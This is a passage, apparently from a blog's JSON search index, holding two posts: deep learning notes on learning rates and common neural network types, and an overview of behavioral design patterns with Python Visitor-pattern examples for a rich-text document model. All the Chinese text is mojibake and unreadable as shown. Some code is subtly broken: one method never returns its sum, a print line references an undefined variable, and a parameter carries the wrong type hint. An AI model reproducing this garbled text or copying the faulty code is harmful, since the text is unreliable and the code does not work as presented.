ç‡çš„ä½œç”¨ï¼š\nå­¦ä¹ ç‡å†³å®šäº†æˆ‘ä»¬åœ¨æ¢¯åº¦æŒ‡ç¤ºçš„æ–¹å‘ä¸Šç§»åŠ¨çš„æ­¥é•¿ã€‚è¾ƒé«˜çš„å­¦ä¹ ç‡æ„å‘³ç€æ›´å¤§çš„æ­¥é•¿ï¼Œå¯ä»¥åŠ å¿«å­¦ä¹ è¿‡ç¨‹ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´è¶…è¿‡æœ€ä¼˜ç‚¹ï¼Œç”šè‡³å¯¼è‡´æ¨¡å‹ä¸ç¨³å®šã€‚ç›¸åï¼Œè¾ƒä½çš„å­¦ä¹ ç‡æ„å‘³ç€æ›´å°çš„æ­¥é•¿ï¼Œå­¦ä¹ è¿‡ç¨‹æ›´ç¨³å®šï¼Œä½†è®­ç»ƒé€Ÿåº¦ä¼šå‡æ…¢ï¼Œä¸”å¯èƒ½é™·å…¥å±€éƒ¨æœ€å°å€¼ã€‚ å› æ­¤ï¼Œé€‰æ‹©åˆé€‚çš„å­¦ä¹ ç‡æ˜¯éå¸¸é‡è¦çš„ã€‚å¤ªé«˜æˆ–å¤ªä½çš„å­¦ä¹ ç‡éƒ½å¯èƒ½å¯¼è‡´è®­ç»ƒæ•ˆæœä¸ä½³ã€‚åœ¨å®è·µä¸­ï¼Œé€šå¸¸éœ€è¦é€šè¿‡å®éªŒæ¥ç¡®å®šæœ€ä½³çš„å­¦ä¹ ç‡ã€‚æ­¤å¤–ï¼Œä¹Ÿæœ‰ä¸€äº›è‡ªé€‚åº”å­¦ä¹ ç‡çš„ä¼˜åŒ–ç®—æ³•ï¼ˆå¦‚ Adamã€RMSprop ç­‰ï¼‰ï¼Œå®ƒä»¬å¯ä»¥åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­è‡ªåŠ¨è°ƒæ•´å­¦ä¹ ç‡ï¼Œä»¥æé«˜è®­ç»ƒçš„æ•ˆæœå’Œç¨³å®šæ€§ã€‚\nå¸¸è§çš„ç¥ç»ç½‘ç»œç±»å‹ å¸¸è§çš„ç¥ç»ç½‘ç»œç±»å‹ï¼š\nå…¨è¿æ¥ç¥ç»ç½‘ç»œï¼ˆFully Connected Networksï¼‰:\nä¹Ÿè¢«ç§°ä¸ºå¯†é›†ç¥ç»ç½‘ç»œï¼Œæ˜¯æœ€åŸºæœ¬çš„ç¥ç»ç½‘ç»œå½¢å¼ã€‚åœ¨è¿™ç§ç½‘ç»œä¸­ï¼Œæ¯ä¸ªç¥ç»å…ƒä¸å‰ä¸€å±‚çš„æ‰€æœ‰ç¥ç»å…ƒç›¸è¿ã€‚ é€‚ç”¨äºç»“æ„åŒ–æ•°æ®ï¼Œå¦‚è¡¨æ ¼æ•°æ®æˆ–ç®€å•çš„åˆ†ç±»ä»»åŠ¡ã€‚ å·ç§¯ç¥ç»ç½‘ç»œï¼ˆConvolutional Neural Networks, CNNsï¼‰:\nç‰¹åˆ«é€‚ç”¨äºå¤„ç†å›¾åƒæ•°æ®ã€‚é€šè¿‡å·ç§¯å±‚ï¼ŒCNN èƒ½å¤Ÿæ•æ‰å›¾åƒä¸­çš„å±€éƒ¨ç‰¹å¾ã€‚ å¹¿æ³›åº”ç”¨äºå›¾åƒåˆ†ç±»ã€ç‰©ä½“æ£€æµ‹ã€å›¾åƒåˆ†å‰²ç­‰ä»»åŠ¡ã€‚ å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRecurrent Neural Networks, RNNsï¼‰:\nè®¾è®¡ç”¨æ¥å¤„ç†åºåˆ—æ•°æ®ï¼Œå¦‚æ—¶é—´åºåˆ—æ•°æ®æˆ–è‡ªç„¶è¯­è¨€ã€‚ RNN èƒ½å¤Ÿå¤„ç†è¾“å…¥æ•°æ®çš„æ—¶é—´åŠ¨æ€ç‰¹æ€§ï¼Œé€‚ç”¨äºè¯­éŸ³è¯†åˆ«ã€è¯­è¨€å»ºæ¨¡ç­‰ä»»åŠ¡ã€‚ é•¿çŸ­æ—¶è®°å¿†ç½‘ç»œï¼ˆLong Short-Term Memory, LSTMï¼‰:\nLSTM æ˜¯ RNN çš„ä¸€ç§å˜ä½“ï¼Œå®ƒèƒ½å¤Ÿå­¦ä¹ é•¿æœŸä¾èµ–å…³ç³»ï¼Œè§£å†³äº†æ™®é€š RNN éš¾ä»¥æ•æ‰é•¿æœŸä¾èµ–çš„é—®é¢˜ã€‚ å¸¸ç”¨äºå¤æ‚çš„åºåˆ—ä»»åŠ¡ï¼Œå¦‚æœºå™¨ç¿»è¯‘ã€æ–‡æœ¬ç”Ÿæˆç­‰ã€‚ ç”Ÿæˆå¯¹æŠ—ç½‘ç»œï¼ˆGenerative Adversarial Networks, GANsï¼‰:\nç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šç”Ÿæˆå™¨å’Œé‰´åˆ«å™¨ã€‚GANs èƒ½å¤Ÿç”Ÿæˆæ–°çš„ã€ä¸çœŸå®æ•°æ®ç±»ä¼¼çš„æ•°æ®ã€‚ åº”ç”¨äºå›¾åƒç”Ÿæˆã€å›¾åƒé£æ ¼è½¬æ¢ç­‰é¢†åŸŸã€‚ å˜æ¢å™¨ç½‘ç»œï¼ˆTransformer Networksï¼‰:\nä¸»è¦ç”¨äºå¤„ç†åºåˆ—æ•°æ®ï¼Œç‰¹åˆ«æ˜¯åœ¨è‡ªç„¶è¯­è¨€å¤„ç†é¢†åŸŸè¡¨ç°å‡ºè‰²ã€‚ ä¾èµ–äºâ€œæ³¨æ„åŠ›æœºåˆ¶â€ï¼Œèƒ½å¤ŸåŒæ—¶å¤„ç†æ•´ä¸ªåºåˆ—ï¼Œæé«˜äº†å¤„ç†é•¿åºåˆ—çš„èƒ½åŠ›ã€‚ è¿™äº›ç½‘ç»œå¯ä»¥æ ¹æ®å…·ä½“é—®é¢˜å’Œæ•°æ®ç±»å‹è¿›è¡Œé€‰æ‹©å’Œå®šåˆ¶ã€‚\nå‚è€ƒèµ„æ–™ Deep Neural Networks with PyTorch Learn the Basics â€” PyTorch Tutorials 2.3.0+cu121 documentation ","description":"","tags":["ai","deep-learning"],"title":"æ·±åº¦å­¦ä¹ ç¬”è®°ï¼šç†è®ºåŸºç¡€","uri":"/posts/deep-learning-notes-theory-foundation/"},{"categories":null,"content":"è®¾è®¡æ¨¡å¼æ€»ç›®å½•è¯·å‚è€ƒï¼šè®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢ã€‚\nè´£ä»»é“¾ (Chain of Responsibility) æ„å›¾ ä½¿å¤šä¸ªå¯¹è±¡éƒ½æœ‰æœºä¼šå¤„ç†è¯·æ±‚ï¼Œä»è€Œé¿å…è¯·æ±‚çš„å‘é€è€…å’Œæ¥æ”¶è€…ä¹‹é—´çš„è€¦åˆå…³ç³»ã€‚å°†è¿™äº›å¯¹è±¡è¿æˆä¸€æ¡é“¾ï¼Œå¹¶æ²¿ç€è¿™æ¡é“¾ä¼ é€’è¯¥è¯·æ±‚ï¼Œç›´åˆ°æœ‰ä¸€ä¸ªå¯¹è±¡å¤„ç†å®ƒä¸ºæ­¢ã€‚\næ¡ˆä¾‹ Android çš„äº‹ä»¶ä¼ é€’æœºåˆ¶å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„è´£ä»»é“¾æ¨¡å¼çš„åº”ç”¨ã€‚è¯¥åº”ç”¨ç»“åˆäº† ç»„åˆ (Composite) æ¨¡å¼ï¼Œåˆ©ç”¨å·²æœ‰çš„è§†å›¾æ ‘ç»“æ„ï¼Œå°†è¯·æ±‚ä»è§†å›¾æ ‘çš„æ ¹èŠ‚ç‚¹ï¼ˆDecorViewï¼‰ä¸€ç›´æ´¾å‘åˆ°å„ä¸ªå­èŠ‚ç‚¹ï¼Œç›´åˆ°æŸä¸ªè§†å›¾å¤„ç†è¯¥äº‹ä»¶ä¸ºæ­¢ã€‚\nç›¸å…³æ¨¡å¼ ç»„åˆ (Composite): å¯ä»¥åˆ©ç”¨å·²æœ‰çš„ Composite ç»“æ„æ¥ä¼ é€’è¯·æ±‚ï¼Œå½¢æˆè´£ä»»é“¾ã€‚ å‘½ä»¤ (Command) æ„å›¾ å°†æŸç§è¯·æ±‚å°è£…ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œæ¢å¥è¯è¯´ï¼Œå°†è¯·æ±‚å‚æ•°åŒ–ï¼Œè¿™æ ·å¯ä»¥è§£è€¦è¯·æ±‚çš„åˆ›å»ºæ–¹å’Œå®ç°æ–¹ï¼Œä¹Ÿæ–¹ä¾¿å¯¹è¯·æ±‚è¿›è¡Œæ’é˜Ÿã€è®°å½•æ—¥å¿—ï¼Œä»¥åŠæ”¯æŒæ’¤é”€ç­‰æ“ä½œã€‚\nç»“æ„ ç”¨æ³•ä»‹ç» å®ç°èœå•ã€æŒ‰é’®åŠŸèƒ½ Command æ¨¡å¼ç‰¹åˆ«é€‚åˆç”¨æ¥å®ç°èœå•ã€æŒ‰é’®çš„åŠŸèƒ½ã€‚ç”¨ Command æ¨¡å¼å®ç°æœ‰å¦‚ä¸‹å¥½å¤„ï¼š\nå¯ä»¥å¾ˆæ–¹ä¾¿çš„è®©ä¸€ä¸ªèœå•å’Œä¸€ä¸ªæŒ‰é’®ä»£è¡¨åŒä¸€é¡¹åŠŸèƒ½ï¼Œåªéœ€è®©äºŒè€…å…±äº«åŒä¸€ä¸ª Command å¯¹è±¡å³å¯ã€‚ å¯ä»¥å¾ˆè½»æ¾çš„åŠ¨æ€æ›¿æ¢æŸé¡¹èœå•æˆ–æŒ‰é’®çš„åŠŸèƒ½ï¼ˆä¾‹å¦‚å®ç°ä¸Šä¸‹æ–‡æœ‰å…³çš„èœå•ï¼‰ï¼Œåªéœ€åŠ¨æ€æ›¿æ¢ Command å¯¹è±¡å³å¯ã€‚ è¿˜å¯ä»¥å¾ˆæ–¹ä¾¿å°†è‹¥å¹²ä¸ªå‘½ä»¤ç»„åˆæˆä¸€ä¸ªæ›´å¤§çš„å‘½ä»¤ï¼Œå®ç°å‘½ä»¤è„šæœ¬ï¼ˆcommand scriptingï¼‰åŠŸèƒ½ã€‚å‚è€ƒ MacroCommand å®å‘½ä»¤ã€‚ MacroCommand å®å‘½ä»¤ MacroCommand æ˜¯ä¸€ä¸ªå…·ä½“çš„ Command å­ç±»ï¼Œå®ƒç”¨æ¥æ‰§è¡Œä¸€ä¸ªå‘½ä»¤åºåˆ—ã€‚ MacroCommand è¿ç”¨äº†Composite ç»„åˆæ¨¡å¼æ¥å®ç°è¿™ç§å±‚æ¬¡ç»“æ„ï¼Œå‚è€ƒä¸‹é¢çš„ç±»å›¾ï¼š\nåä½œ è§£é‡Šå™¨ (Interpreter) æ„å›¾ ç»™å®šä¸€ä¸ªè¯­è¨€ï¼Œå®šä¹‰å®ƒçš„æ–‡æ³•çš„ä¸€ç§è¡¨ç¤ºï¼Œå¹¶å®šä¹‰ä¸€ä¸ªè§£é‡Šå™¨ï¼Œè¿™ä¸ªè§£é‡Šå™¨ä½¿ç”¨è¯¥è¡¨ç¤ºæ¥è§£é‡Šè¯­è¨€ä¸­çš„å¥å­ã€‚\nåŠ¨æœº å¦‚æœä¸€ç§ç‰¹å®šç±»å‹çš„é—®é¢˜å‘ç”Ÿçš„é¢‘ç‡è¶³å¤Ÿé«˜ï¼Œé‚£ä¹ˆå¯èƒ½å°±å€¼å¾—å°†è¯¥é—®é¢˜çš„å„ä¸ªå®ä¾‹è¡¨è¿°ä¸ºä¸€ä¸ªç®€å•è¯­è¨€ä¸­çš„å¥å­ã€‚è¿™æ ·å°±å¯ä»¥æ„å»ºä¸€ä¸ªè§£é‡Šå™¨ï¼Œè¯¥è§£é‡Šå™¨é€šè¿‡è§£é‡Šè¿™äº›å¥å­æ¥è§£å†³è¯¥é—®é¢˜ã€‚\næ¡ˆä¾‹ æœç´¢åŒ¹é…ä¸€ä¸ªæ¨¡å¼çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªå¸¸è§é—®é¢˜ã€‚æ­£åˆ™è¡¨è¾¾å¼æ˜¯æè¿°å­—ç¬¦ä¸²æ¨¡å¼çš„ä¸€ç§æ ‡å‡†è¯­è¨€ã€‚ä¸å…¶ä¸ºæ¯ä¸€ä¸ªæ¨¡å¼éƒ½æ„é€ ä¸€ä¸ªç‰¹å®šçš„ç®—æ³•ï¼Œä¸å¦‚ä½¿ç”¨ä¸€ç§é€šç”¨çš„æœç´¢ç®—æ³•æ¥è§£é‡Šæ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚\nè¿­ä»£å™¨ (Iterator) æ„å›¾ æä¾›ä¸€ç§æ–¹æ³•é¡ºåºè®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡ä¸­çš„å„ä¸ªå…ƒç´ ï¼Œè€Œåˆä¸éœ€è¦æš´éœ²è¯¥å¯¹è±¡çš„å†…éƒ¨è¡¨ç¤ºã€‚\nç±»å›¾ è¿­ä»£å™¨æ¨¡å¼åº”ç”¨å¹¿æ³›ï¼ŒåŸç†ä¹Ÿæ¯”è¾ƒç®€å•ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå…¸å‹çš„ç±»å›¾ã€‚\nç›¸å…³æ¨¡å¼ ç»„åˆ (Composite): è¿­ä»£å™¨å¯ä»¥è¢«ç”¨æ¥è¿­ä»£ç»„åˆæ¨¡å¼ä¸­çš„å¯¹è±¡ã€‚ å·¥å‚æ–¹æ³• (Factory Method): å¦‚ä¸Šé¢çš„ç±»å›¾æ‰€ç¤ºï¼Œè¿­ä»£å™¨ä¸­åˆ©ç”¨äº†å·¥å‚æ–¹æ³•æ¥å®ä¾‹åŒ–å¯¹åº”çš„è¿­ä»£å™¨å­ç±»ã€‚ å¤‡å¿˜å½• (Memento): è¿­ä»£å™¨å¯ä½¿ç”¨ memento æ¥æ•è·ä¸€ä¸ªè¿­ä»£çš„çŠ¶æ€ã€‚ ä¸­ä»‹è€… (Mediator) æ„å›¾ ç”¨ä¸€ä¸ªä¸­ä»‹å¯¹è±¡æ¥å°è£…ä¸€ç³»åˆ—çš„å¯¹è±¡äº¤äº’ã€‚ä¸­ä»‹è€…ä½¿å„å¯¹è±¡ä¸éœ€è¦æ˜¾å¼åœ°ç›¸äº’å¼•ç”¨ï¼Œä»è€Œä½¿å…¶è€¦åˆæ¾æ•£ï¼Œè€Œä¸”å¯ä»¥ç‹¬ç«‹åœ°æ”¹å˜å®ƒä»¬ä¹‹é—´çš„äº¤äº’ã€‚\nç»“æ„ æ•ˆæœ å‡å°‘äº†å­ç±»ç”Ÿæˆ Mediator å°†åŸæœ¬åˆ†å¸ƒäºå¤šä¸ªå¯¹è±¡é—´çš„è¡Œä¸ºé›†ä¸­åœ¨ä¸€èµ·ã€‚æ”¹å˜è¿™äº›è¡Œä¸ºåªéœ€è¦ç”Ÿæˆ Mediator çš„å­ç±»å³å¯ï¼Œè¿™æ ·å„ä¸ª Colleague ç±»å¯è¢«å¤ç”¨ã€‚ å°†å„ Colleague è§£è€¦ Mediator æœ‰åˆ©äºå„ Colleague é—´çš„æ¾è€¦åˆï¼Œä½ å¯ä»¥ç‹¬ç«‹åœ°æ”¹å˜å’Œå¤ç”¨å„ Colleague ç±»å’Œ Mediator ç±»ã€‚ ç®€åŒ–äº†å¯¹è±¡åè®® ç”¨ Mediator å’Œå„ Colleague é—´çš„ä¸€å¯¹å¤šäº¤äº’æ¥ä»£æ›¿ Colleague é—´çš„å¤šå¯¹å¤šäº¤äº’ã€‚ä¸€å¯¹å¤šçš„å…³ç³»æ›´æ˜“äºç†è§£ã€ç»´æŠ¤å’Œæ‰©å±•ã€‚ å¯¹å¯¹è±¡å¦‚ä½•åä½œè¿›è¡Œäº†æŠ½è±¡ å°†ä¸­ä»‹ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„æ¦‚å¿µå¹¶å°†å…¶å°è£…åœ¨ä¸€ä¸ªå¯¹è±¡ä¸­ï¼Œä½¿ä½ å°†æ³¨æ„åŠ›ä»å¯¹è±¡å„è‡ªæœ¬èº«çš„è¡Œä¸ºè½¬ç§»åˆ°å®ƒä»¬ä¹‹é—´çš„äº¤äº’ä¸Šæ¥ã€‚è¿™æœ‰åŠ©äºå¼„æ¸…æ¥šä¸€ä¸ªç³»ç»Ÿä¸­çš„å¯¹è±¡æ˜¯å¦‚ä½•äº¤äº’çš„ã€‚ ä½¿æ§åˆ¶é›†ä¸­åŒ– ä¸­ä»‹è€…æ¨¡å¼å°†äº¤äº’çš„å¤æ‚æ€§å˜ä¸ºä¸­ä»‹è€…çš„å¤æ‚æ€§ã€‚å› ä¸ºä¸­ä»‹è€…å°è£…äº†åè®®ï¼Œè¿™ä¼šå¸¦æ¥ä¸Šè¿°æåˆ°çš„å¥½å¤„ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´è¯¥å¯¹è±¡å˜å¾—æ¯”è¾ƒå¤æ‚å’Œéš¾ä»¥ç»´æŠ¤ã€‚ ç›¸å…³æ¨¡å¼ å¤–è§‚ (Facade): Facade æ¨¡å¼ä¸ä¸­ä»‹è€…çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œå®ƒæ˜¯å¯¹ä¸€ä¸ªå­ç³»ç»Ÿè¿›è¡ŒæŠ½è±¡ï¼Œä»è€Œæä¾›ä¸€ä¸ªæ›´ä¸ºæ–¹ä¾¿çš„æ¥å£ã€‚å®ƒçš„åè®®ä¸»è¦æ˜¯å•å‘çš„ï¼Œå³é€šè¿‡ Facade æ¥å£æ¥è®¿é—®å­ç³»ç»Ÿã€‚ç›¸åï¼ŒMediator æä¾›äº†å„ Colleague å¯¹è±¡ä¸æ”¯æŒçš„åä½œè¡Œä¸ºï¼Œè€Œä¸”åè®®æ˜¯å¤šå‘çš„ã€‚ è§‚å¯Ÿè€… (Observer): Mediator å¯ä»¥ä½œä¸ºä¸€ä¸ª Observer æ¥è®¢é˜…å„ Colleague çš„çŠ¶æ€å˜åŒ–ï¼Œå¹¶åšå‡ºå“åº”ï¼ˆä¾‹å¦‚å°†çŠ¶æ€å˜åŒ–çš„ç»“æœä¼ æ’­ç»™å…¶ä»–çš„ Colleagueï¼‰ã€‚ å¤‡å¿˜å½• (Memento) æ„å›¾ åœ¨ä¸ç ´åå°è£…æ€§çš„å‰æä¸‹ï¼Œæ•è·ä¸€ä¸ªå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œå¹¶åœ¨è¯¥å¯¹è±¡ä¹‹å¤–ä¿å­˜è¿™ä¸ªçŠ¶æ€ã€‚è¿™æ ·ä»¥åå°±å¯ä»¥å°†è¯¥å¯¹è±¡æ¢å¤åˆ°åŸå…ˆä¿å­˜çš„çŠ¶æ€ã€‚\nç»“æ„ Memento å¤‡å¿˜å½• å¤‡å¿˜å½•å­˜å‚¨åŸå‘å™¨å¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ã€‚åŸå‘å™¨æ ¹æ®éœ€è¦å†³å®šå¤‡å¿˜å½•å­˜å‚¨åŸå‘å™¨çš„å“ªäº›å†…éƒ¨çŠ¶æ€ã€‚ é˜²æ­¢åŸå‘å™¨ä»¥å¤–çš„å…¶ä»–å¯¹è±¡è®¿é—®å¤‡å¿˜å½•ã€‚å¤‡å¿˜å½•å®é™…ä¸Šæœ‰ä¸¤ä¸ªæ¥å£ï¼Œç®¡ç†è€…ï¼ˆCaretakerï¼‰åªèƒ½çœ‹åˆ°å¤‡å¿˜å½•çš„ çª„æ¥å£ ï¼ˆåªèƒ½å°†å¤‡å¿˜å½•ä¼ é€’ç»™å…¶ä»–å¯¹è±¡ï¼‰ï¼Œè€ŒåŸå‘å™¨èƒ½å¤Ÿçœ‹åˆ°ä¸€ä¸ªâ€‹å®½æ¥å£, å…è®¸å®ƒè®¿é—®æ¢å¤åˆ°å…ˆå‰çŠ¶æ€æ‰€éœ€çš„æ‰€æœ‰æ•°æ®ã€‚ Originator åŸå‘å™¨ åŸå‘å™¨åˆ›å»ºä¸€ä¸ªå¤‡å¿˜å½•ï¼Œç”¨ä»¥è®°å½•å½“å‰æ—¶åˆ»å®ƒçš„å†…éƒ¨çŠ¶æ€ã€‚ ä½¿ç”¨å¤‡å¿˜å½•æ¢å¤å†…éƒ¨çŠ¶æ€ã€‚ Caretaker ç®¡ç†è€…ï¼Œä¾‹å¦‚â€œæ’¤é”€æœºåˆ¶â€ è´Ÿè´£ä¿å­˜å¥½å¤‡å¿˜å½• ä¸èƒ½å¯¹å¤‡å¿˜å½•çš„å†…å®¹è¿›è¡Œæ“ä½œæˆ–æ£€æŸ¥ã€‚ ç›¸å…³æ¨¡å¼ Command å‘½ä»¤: å‘½ä»¤å¯ä½¿ç”¨å¤‡å¿˜å½•æ¥ä¸ºå¯æ’¤é”€çš„æ“ä½œç»´æŠ¤çŠ¶æ€ã€‚ Iterator è¿­ä»£å™¨: å¤‡å¿˜å½•å¯ç”¨äºè¿­ä»£å™¨çš„å®ç°ï¼Œç”¨äºå­˜å‚¨è¿­ä»£å™¨çš„å½“å‰çŠ¶æ€ã€‚ è§‚å¯Ÿè€… (Observer) çŠ¶æ€ (State) ç­–ç•¥ (Strategy) æ¨¡æ¿æ–¹æ³• (Template Method) è®¿é—®è€… (Visitor) æ„å›¾ å½“æˆ‘ä»¬éå†ä¸€ä¸ªå¯¹è±¡ç»“æ„çš„å…ƒç´ æ—¶ï¼Œè¯¥æ¨¡å¼å…è®¸æˆ‘ä»¬åœ¨ä¸ä¿®æ”¹å„ä¸ªå…ƒç´ çš„ç±»ç»“æ„çš„å‰æä¸‹ï¼Œä¸ºæ¯ä¸ªå…ƒç´ å¢åŠ ä»»æ„ç±»å‹çš„æ–°æ“ä½œã€‚\næ¡ˆä¾‹ï¼šå¯Œæ–‡æœ¬æ–‡æ¡£æ¨¡å‹ å¯Œæ–‡æœ¬æ–‡æ¡£æ¨¡å‹ å‡è®¾æˆ‘ä»¬è¦å®ç°ä¸€ä¸ªå¯Œæ–‡æœ¬æ–‡æ¡£æ¨¡å‹ï¼Œè¯¥æ¨¡å‹çš„ç»“æ„ç±»ä¼¼ä¸‹å›¾æ‰€ç¤ºï¼š\nå¯¹åº”çš„ç±»å›¾å¦‚ä¸‹ï¼š\nç»Ÿè®¡å­—ç¬¦ä¸ªæ•° æˆ‘ä»¬å¸Œæœ›ä¸ºä¸Šè¿°æ–‡æ¡£ç»“æ„å¢åŠ å­—ç¬¦ä¸ªæ•°ç»Ÿè®¡åŠŸèƒ½ï¼Œä¸€ä¸ªç®€å•çš„å®ç°å¯èƒ½ç±»ä¼¼è¿™æ ·ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Element: # ... def char_count(self): raise NotImplementedError() class Block(Element): # ... def char_count(self): num = 0 for c in self.children: num += c.char_count() class RichText(Element): # ... def char_count(self): return len(self.text) class FileLink(Element): # ... def char_count(self): return 0 page = Page() # ... total_count = page.char_count() print(f\"total char count: {ccv.total_count}\") è¯¥å®ç°ä¼šé€’å½’ç»Ÿè®¡æ•´ä¸ªæ–‡æ¡£ç»“æ„æ ‘ï¼Œå¹¶è¿”å›æœ€ç»ˆçš„æ€»å’Œã€‚\næ­¤æ—¶ï¼Œç±»å›¾å˜æˆç±»ä¼¼è¿™æ ·ï¼š\nå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬é€šè¿‡ä¸ºåŸºç±» Element å¢åŠ ä¸€ä¸ªæ–¹æ³• char_count(), å¹¶åœ¨ç›¸åº”çš„å­ç±»ä¸­å®ç°è¯¥æ–¹æ³•ï¼Œæ¥å®ç°å­—ç¬¦ä¸ªæ•°çš„ç»Ÿè®¡åŠŸèƒ½ã€‚\næ–‡æ¡£å¯¼å‡º å¦‚æœä»…ä»…æ˜¯å¢åŠ ä¸€ä¸ªå­—ç¬¦ä¸ªæ•°ç»Ÿè®¡åŠŸèƒ½ï¼Œä¸Šè¿°æ–¹æ³•çœ‹èµ·æ¥å¹¶æ— å¤§ç¢ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹ï¼Œå¦‚æœè¦å¢åŠ æ–‡æ¡£å¯¼å‡ºåŠŸèƒ½ï¼Œæ¯”å¦‚éœ€è¦æ”¯æŒå¯¼å‡ºä¸ºå¦‚ä¸‹ä¸åŒæ ¼å¼çš„æ–‡æ¡£ï¼š\nmarkdown html pdf çº¯æ–‡æœ¬ â€¦ æˆ‘ä»¬åº”è¯¥å¦‚ä½•åº”å¯¹ï¼Ÿå¦‚æœå»¶ç»­ä¸Šé¢çš„ç®€å•æ–¹æ¡ˆï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Element ä¸­å¢åŠ ç±»ä¼¼ä¸‹é¢çš„æ¥å£ï¼š\nexport_markdown() export_html() export_pdf() export_text() â€¦ å¦‚æœæˆ‘ä»¬å¸Œæœ›å†å¢åŠ ä¸€ä¸ªæ‹¼å†™æ£€æŸ¥çš„åŠŸèƒ½ï¼Œå¯èƒ½è¿˜éœ€è¦å¢åŠ ä¸€ä¸ª spellcheck() æ–¹æ³•ã€‚è¿™æ˜¾ç„¶ä¸æ˜¯ä¸€ä¸ªç†æƒ³çš„æ–¹æ¡ˆï¼Œè¿™ä¼šå¯¼è‡´æˆ‘ä»¬çš„ç±»ç»“æ„ååˆ†çš„ä¸ç¨³å®šï¼ŒåŸºç±»å’Œå­ç±»çš„æ¥å£ä¸æ–­è†¨èƒ€ã€ä¸æ–­å¼•å…¥æ–°çš„å˜åŒ–ç‚¹ï¼Œæ—¢ä¸ç¬¦åˆå•ä¸€èŒè´£åŸåˆ™ï¼Œä¹Ÿä¸ç¬¦åˆå¼€é—­åŸåˆ™ã€‚\næˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ç§æ–¹æ¡ˆä¸‹çš„ç±»å›¾ï¼š\nå¼•å…¥è®¿é—®è€…æ¨¡å¼ å¦‚ä½•åœ¨ä¸ä¿®æ”¹ Element åŠå…¶å­ç±»ç»“æ„çš„å‰æä¸‹ï¼Œä¸ºæˆ‘ä»¬çš„æ–‡æ¡£æ¨¡å‹æ–°å¢å„ç§ä¸åŒç±»å‹çš„æ“ä½œå‘¢ï¼Ÿè®¿é—®è€…æ¨¡å¼å¯ä»¥å¸®åŠ©æˆ‘ä»¬è§£å†³è¿™ç±»é—®é¢˜ã€‚\næˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹å¼•å…¥è®¿é—®è€…æ¨¡å¼ä¹‹åï¼Œå­—ç¬¦ç»Ÿè®¡åŠŸèƒ½ä¼šæ€ä¹ˆå†™ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 class Element: # ... def accept(self, v: Visitor): raise NotImplementedError() class Block(Element): # ... def accept(self, v: Visitor): v.visitBlock(self) for c in self.children: c.accept(v) class RichText(Element): # ... def accept(self, v: Visitor): v.visitRichText(self) class FileLink(Element): # ... def accept(self, v: Visitor): v.visitFileLink(self) class ListItemBlock(Block): # ... def accept(self, v: Visitor): v.visitListItemBlock(self) for c in self.children: c.accept(v) # ... class Visitor: def visitBlock(self, b: Block): pass def visitRichText(self, t: RichText): pass def visitFileLink(self, f: FileLink): pass def visitListItemBlock(self, f: FileLink): pass # ... class CharCountVisitor(Visitor): def __init__(self): self.total_count = 0 def visitRichText(self, t: RichText): self.total_count += len(t.text) ccv = CharCountVisitor() page.accept(ccv) print(f\"total char count: {ccv.total_count}\") çœ‹èµ·æ¥ä¼¼ä¹å˜å¤æ‚äº†ï¼Œä½†æ˜¯é€šç”¨æ€§å’Œæ‰©å±•æ€§å¾—åˆ°äº†å¤§å¹…æå‡ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæƒ³å¢åŠ ä¸€ä¸ª markdown å¯¼å‡ºåŠŸèƒ½ï¼Œåªéœ€æ–°å¢ä¸€ä¸ª MarkdownExporterVisitor å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class MarkdownExporterVisitor(Visitor): def __init__(self): self.content = [] def visitRichText(self, t: RichText): c = t.text if t.font_weight == 'italic': c = f'*{t.text}*' elif t.font_weight == 'bold': c = f'**{t.text}**' # ... self.content.append(c) def visitListItemBlock(self, li: ListItemBlock): prefix = '- ' if li.list_type == 'ordered_list': prefix = '1. ' # handle indentation... self.content.append(prefix) # ... æ–°å¢å…¶ä»–æ–‡æ¡£æ ¼å¼çš„å¯¼å‡ºåŠŸèƒ½ï¼Œä»¥åŠæ‹¼å†™æ£€æŸ¥ç­‰åŠŸèƒ½ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œåªéœ€ç‹¬ç«‹çš„å¢åŠ 